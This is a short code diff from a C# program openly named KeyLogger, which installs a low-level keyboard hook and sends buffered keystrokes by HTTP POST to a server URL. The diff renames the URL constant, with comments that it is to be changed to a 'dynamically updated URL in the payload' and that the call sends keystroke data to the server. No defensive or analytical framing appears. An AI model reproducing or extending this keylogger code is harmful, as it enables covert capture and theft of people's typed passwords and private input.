@@ -8,7 +8,7 @@ using System.Windows.Forms;
 
 class KeyLogger
 {
-    private const string SERVER_URL = "http://127.0.0.1:2000/log"; // Change as needed
+    private const string URL = "http://127.0.0.1:2000/log"; // Change this based on the dynamically updated URL in the payload
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private static StringBuilder buffer = new StringBuilder();
@@ -93,7 +93,7 @@ class KeyLogger
             {
                 var postData = $"data={Uri.EscapeDataString(data)}";
                 client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
-                client.UploadString(SERVER_URL, "POST", postData);
+                client.UploadString(URL, "POST", postData);  // Send the keystroke data to the server
             }
         }
         catch (Exception ex)
